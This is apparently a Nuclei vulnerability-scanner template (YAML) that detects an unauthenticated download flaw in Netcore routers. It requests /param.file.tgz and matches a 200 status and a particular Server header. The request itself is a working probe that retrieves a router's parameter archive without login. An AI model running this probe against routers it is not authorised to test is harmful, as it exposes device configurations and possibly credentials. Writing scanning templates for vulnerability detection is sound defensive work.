id: Netcore-unauth

info:
  name: Netcore路由器param.file.tgz文件存在未授权下载漏洞
  author: Str1am
  severity: high
  tags: Netcore,unauth

requests:
  - method: GET
    path:
      - "{{BaseURL}}/param.file.tgz"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Server: HTTP Software 1.1"
        part: header
        condition: and
